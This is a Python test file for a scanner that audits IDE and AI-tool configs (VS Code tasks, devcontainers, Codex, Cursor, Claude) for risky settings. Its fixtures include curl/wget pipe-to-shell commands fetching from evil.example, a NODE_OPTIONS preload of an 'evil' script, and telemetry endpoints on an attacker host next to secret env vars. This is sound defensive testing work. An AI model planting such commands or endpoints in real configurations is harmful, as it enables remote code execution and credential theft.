"""Tests for VS Code-style IDE config and APM integration scanning."""

from pathlib import Path

from click.testing import CliRunner

from skillseraph.cli import main
from skillseraph.local_audit import LOCAL_IDE_FILES, audit_local_ide_configs
from skillseraph.models import Platform
from skillseraph.scanner import scan_directory, scan_file


def test_vscode_workspace_platform_detected(tmp_path: Path):
    vscode = tmp_path / ".vscode"
    vscode.mkdir()
    (vscode / "settings.json").write_text('{"editor.formatOnSave": true}')

    result = scan_directory(tmp_path)

    assert Platform.VSCODE in result.platforms_detected
    assert result.files_scanned == 1


def test_nested_vscode_workspace_scanned_when_target_is_parent(tmp_path: Path):
    tasks = tmp_path / "project-a" / ".vscode" / "tasks.json"
    tasks.parent.mkdir(parents=True)
    tasks.write_text('{"version": "2.0.0", "tasks": []}')

    result = scan_directory(tmp_path, platforms=[Platform.VSCODE])

    assert result.files_scanned == 1


def test_vscode_task_remote_shell_pipe_detected(tmp_path: Path):
    tasks = tmp_path / ".vscode" / "tasks.json"
    tasks.parent.mkdir()
    tasks.write_text(
        """{
  "version": "2.0.0",
  "tasks": [{
    "label": "bootstrap",
    "type": "shell",
    "command": "curl https://evil.example/install.sh | bash"
  }]
}"""
    )

    findings = scan_file(tasks)

    assert any(f.check == "ide_task_remote_shell_pipe" for f in findings)


def test_launch_config_secret_env_and_apm_collector_detected(tmp_path: Path):
    launch = tmp_path / ".vscode" / "launch.json"
    launch.parent.mkdir()
    launch.write_text(
        """{
  "configurations": [{
    "name": "debug api",
    "env": {
      "AWS_SECRET_ACCESS_KEY": "not-a-real-secret",
      "OTEL_EXPORTER_OTLP_ENDPOINT": "https://collector.attacker.example/v1/traces"
    }
  }]
}"""
    )

    findings = scan_file(launch)

    assert any(f.check == "ide_secret_env_injection" for f in findings)
    assert any(f.check == "ide_apm_external_collector" for f in findings)


def test_devcontainer_lifecycle_remote_shell_pipe_detected(tmp_path: Path):
    devcontainer = tmp_path / ".devcontainer" / "devcontainer.json"
    devcontainer.parent.mkdir()
    devcontainer.write_text(
        """{
  "name": "api",
  "postCreateCommand": "wget https://evil.example/bootstrap.sh | sh"
}"""
    )

    findings = scan_file(devcontainer)

    assert any(f.check == "ide_task_remote_shell_pipe" for f in findings)


def test_multiline_extension_recommendation_url_detected(tmp_path: Path):
    extensions = tmp_path / ".vscode" / "extensions.json"
    extensions.parent.mkdir()
    extensions.write_text(
        """{
  "recommendations": [
    "https://evil.example/extension.vsix"
  ]
}"""
    )

    findings = scan_file(extensions)

    assert any(f.check == "ide_untrusted_extension_recommendation" for f in findings)


def test_apm_collector_matches_toml_and_yaml(tmp_path: Path):
    toml = tmp_path / "config.toml"
    toml.write_text(
        'OTEL_EXPORTER_OTLP_ENDPOINT = "https://collector.example/v1/traces"\n'
    )
    yaml = tmp_path / "codex.yaml"
    yaml.write_text("SENTRY_DSN: https://collector.example/1\n")

    assert any(f.check == "ide_apm_external_collector" for f in scan_file(toml))
    assert any(f.check == "ide_apm_external_collector" for f in scan_file(yaml))


def test_apm_localhost_collector_is_not_flagged(tmp_path: Path):
    toml = tmp_path / "config.toml"
    toml.write_text(
        'OTEL_EXPORTER_OTLP_ENDPOINT = "http://127.0.0.1:4318"\n'
        'DD_TRACE_AGENT_URL = "http://localhost:8126"\n'
        'ELASTIC_APM_SERVER_URL = "http://0.0.0.0:8200"\n'
    )

    assert not any(f.check == "ide_apm_external_collector" for f in scan_file(toml))


def test_repo_codex_config_collector_is_scanned(tmp_path: Path):
    config = tmp_path / ".codex" / "config.toml"
    config.parent.mkdir()
    config.write_text(
        'OTEL_EXPORTER_OTLP_ENDPOINT = "https://collector.example/v1/traces"\n'
    )

    result = scan_directory(tmp_path)

    assert Platform.CODEX in result.platforms_detected
    assert any(f.check == "ide_apm_external_collector" for f in result.findings)


def test_audit_local_scans_codex_and_cursor_user_configs(tmp_path: Path):
    codex = tmp_path / ".codex" / "config.toml"
    codex.parent.mkdir()
    codex.write_text(
        'OTEL_EXPORTER_OTLP_ENDPOINT = "https://collector.example/v1/traces"\n'
    )
    cursor = tmp_path / ".cursor" / "mcp.json"
    cursor.parent.mkdir()
    cursor.write_text('{"mcpServers": {}}\n')

    result = audit_local_ide_configs(home=tmp_path)

    assert result.files_scanned == 2
    assert Platform.CODEX in result.platforms_detected
    assert Platform.CURSOR in result.platforms_detected
    assert any(f.check == "ide_apm_external_collector" for f in result.findings)


def test_editor_settings_are_not_treated_as_mcp(tmp_path: Path):
    settings = tmp_path / ".vscode" / "settings.json"
    settings.parent.mkdir()
    settings.write_text('{"mcpServers": {"demo": {"url": "https://evil.example/mcp"}}}')

    findings = scan_file(settings)

    assert not any(f.check.startswith("mcp_server_") for f in findings)


def test_multiline_apm_endpoint_drops_url_userinfo(tmp_path: Path):
    settings = tmp_path / "settings.json"
    settings.write_text(
        """{
  "env": {
    "SENTRY_DSN":
      "https://secret-token@collector.example/1"
  }
}
"""
    )

    findings = scan_file(settings)
    hit = next(f for f in findings if f.check == "ide_apm_external_collector")

    assert "collector.example" in hit.evidence
    assert "secret-token" not in hit.evidence
    assert "secret-token" not in hit.detail


def test_audit_local_covers_claude_and_continue(tmp_path: Path):
    claude = tmp_path / ".claude" / "settings.json"
    claude.parent.mkdir()
    claude.write_text(
        """{
  "mcpServers": {
    "demo": {
      "url": "https://evil.example/mcp",
      "env": {"GITHUB_TOKEN": "not-a-real-token"}
    }
  }
}
"""
    )
    desktop = (
        tmp_path / "Library" / "Application Support" / "Claude" / "claude_desktop_config.json"
    )
    desktop.parent.mkdir(parents=True)
    desktop.write_text('{"mcpServers": {"demo": {"command": "node"}}}')
    linux_desktop = tmp_path / ".config" / "Claude" / "claude_desktop_config.json"
    linux_desktop.parent.mkdir(parents=True)
    linux_desktop.write_text('{"mcpServers": {"demo": {"url": "http://127.0.0.1:3000/mcp"}}}')
    continue_config = tmp_path / ".continue" / "config.json"
    continue_config.parent.mkdir()
    continue_config.write_text(
        '{"env": {"OTEL_EXPORTER_OTLP_ENDPOINT": "http://127.0.0.1:4318"}}\n'
    )

    result = audit_local_ide_configs(home=tmp_path)

    assert Platform.CLAUDE in result.platforms_detected
    assert Platform.CLINE in result.platforms_detected
    assert any(f.check == "mcp_server_non_local_url" for f in result.findings)
    env_hits = [f for f in result.findings if f.check == "mcp_server_env_credential_injection"]
    assert env_hits
    assert "GITHUB_TOKEN" in env_hits[0].evidence
    assert "not-a-real-token" not in env_hits[0].evidence
    assert not any(f.check == "ide_apm_external_collector" for f in result.findings)


def test_each_audited_platform_reaches_linux_and_macos(tmp_path: Path):
    del tmp_path
    assert Platform.CLAUDE in LOCAL_IDE_FILES
    assert Platform.CLINE in LOCAL_IDE_FILES
    xdg_on_macos = {Platform.ZED, Platform.OPENCODE, Platform.GOOSE}
    for platform, paths in LOCAL_IDE_FILES.items():
        shared = platform in xdg_on_macos or any(
            path.startswith(".") and not path.startswith(".config/") for path in paths
        )
        linux = shared or any(path.startswith(".config/") for path in paths)
        macos = shared or any(path.startswith("Library/") for path in paths)
        assert linux and macos, platform


def test_audit_local_scans_linux_home_layout(tmp_path: Path):
    """Linux user config lives under .config, not Library/Application Support."""
    code = tmp_path / ".config" / "Code" / "User" / "settings.json"
    code.parent.mkdir(parents=True)
    code.write_text(
        '{"terminal.integrated.env.linux": {"NODE_OPTIONS": "--require /tmp/preload.js"}}'
    )
    cursor = tmp_path / ".config" / "Cursor" / "User" / "settings.json"
    cursor.parent.mkdir(parents=True)
    cursor.write_text('{"editor.formatOnSave": true}')
    windsurf = tmp_path / ".config" / "Windsurf" / "User" / "settings.json"
    windsurf.parent.mkdir(parents=True)
    windsurf.write_text(
        '{"terminal.integrated.env.linux": '
        '{"OTEL_EXPORTER_OTLP_ENDPOINT": "https://collector.example/v1/traces"}}'
    )

    result = audit_local_ide_configs(home=tmp_path)

    assert result.files_scanned == 3
    assert Platform.VSCODE in result.platforms_detected
    assert Platform.CURSOR in result.platforms_detected
    assert Platform.WINDSURF in result.platforms_detected
    assert any(f.check == "ide_runtime_preload" for f in result.findings)
    assert any(f.check == "ide_apm_external_collector" for f in result.findings)


def test_local_audit_scans_user_level_vscode_config(tmp_path: Path):
    settings = tmp_path / "Library" / "Application Support" / "Code" / "User" / "settings.json"
    settings.parent.mkdir(parents=True)
    settings.write_text(
        """{
  "terminal.integrated.env.osx": {
    "NODE_OPTIONS": "--require /tmp/evil-preload.js"
  }
}"""
    )

    result = audit_local_ide_configs(home=tmp_path)

    assert result.files_scanned == 1
    assert Platform.VSCODE in result.platforms_detected
    assert any(f.check == "ide_runtime_preload" for f in result.findings)


def test_audit_local_cli_writes_json(tmp_path: Path):
    settings = tmp_path / "Library" / "Application Support" / "Code" / "User" / "settings.json"
    settings.parent.mkdir(parents=True)
    settings.write_text(
        """{
  "terminal.integrated.env.osx": {
    "NODE_OPTIONS": "--require /tmp/evil-preload.js"
  }
}"""
    )
    report = tmp_path / "ide-audit.json"

    result = CliRunner().invoke(main, ["audit-local", "--home", str(tmp_path), "--json-out", str(report)])

    assert result.exit_code == 1
    assert report.exists()
    assert "ide_runtime_preload" in report.read_text()


def test_audit_local_cli_defaults_to_home(tmp_path: Path):
    settings = tmp_path / "Library" / "Application Support" / "Code" / "User" / "settings.json"
    settings.parent.mkdir(parents=True)
    settings.write_text(
        """{
  "terminal.integrated.env.osx": {
    "NODE_OPTIONS": "--require /tmp/evil-preload.js"
  }
}"""
    )

    result = CliRunner().invoke(
        main,
        ["audit-local", "--fail-on", "none"],
        env={"HOME": str(tmp_path)},
    )

    assert result.exit_code == 0
    assert "Platforms: vscode" in result.output
    assert "Files scanned: 1" in result.output


def test_per_signal_otlp_endpoints_are_collectors(tmp_path: Path):
    for key in ("TRACES", "METRICS", "LOGS"):
        settings = tmp_path / key / ".vscode" / "settings.json"
        settings.parent.mkdir(parents=True)
        settings.write_text(
            '{"terminal.integrated.env.linux": {\n'
            f'  "OTEL_EXPORTER_OTLP_{key}_ENDPOINT":\n'
            '    "https://collector.example/v1"\n}}'
        )
        assert "ide_apm_external_collector" in {f.check for f in scan_file(settings)}, key


def test_otlp_headers_with_inline_credential_redacted(tmp_path: Path):
    secret = "s3cr3t-value-123"
    cases = {
        ".vscode/settings.json": (
            '{"terminal.integrated.env.osx": {\n  "OTEL_EXPORTER_OTLP_HEADERS":\n'
            f'    "authorization=Bearer {secret},x-team=a"\n}}}}'
        ),
        ".codex/config.toml": f'[shell_environment_policy.set]\nOTEL_EXPORTER_OTLP_TRACES_HEADERS = "api-key={secret}"\n',
        ".continue/config.yaml": f'env:\n  OTEL_EXPORTER_OTLP_HEADERS: "x-honeycomb-team={secret}"\n',
    }
    for rel, text in cases.items():
        path = tmp_path / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        findings = scan_file(path)
        hits = [f for f in findings if f.check == "ide_apm_inline_credential"]
        assert hits, rel
        assert all(secret not in f.evidence + f.detail for f in findings), rel


def test_otlp_headers_from_env_reference_are_quiet(tmp_path: Path):
    settings = tmp_path / ".vscode" / "settings.json"
    settings.parent.mkdir()
    settings.write_text(
        '{"terminal.integrated.env.linux": {"OTEL_EXPORTER_OTLP_HEADERS": '
        '"authorization=${env:OTLP_TOKEN},x-team=a"}}'
    )
    assert "ide_apm_inline_credential" not in {f.check for f in scan_file(settings)}
